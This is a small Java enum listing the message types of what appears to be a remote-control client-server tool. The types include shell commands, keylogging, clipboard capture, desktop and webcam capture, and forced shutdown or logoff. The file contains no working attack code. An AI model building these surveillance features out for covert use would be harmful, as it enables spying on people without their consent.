package Ultils;

public enum MessageType {
    INFO(1),
    SHUTDOWN(2),
    LOGOFF(3),
    COMMAND(4),
    KEYLOGGER(5),
    CLIPBOARD(6),
    ALTF4(7),
    MESSAGE_BOX(8),
    DESKTOP(9),
    WEBCAM(10);

    private int id;

    MessageType(int id) {
        this.id = id;
    }

    public int getID() {
        return this.id;
    }
}
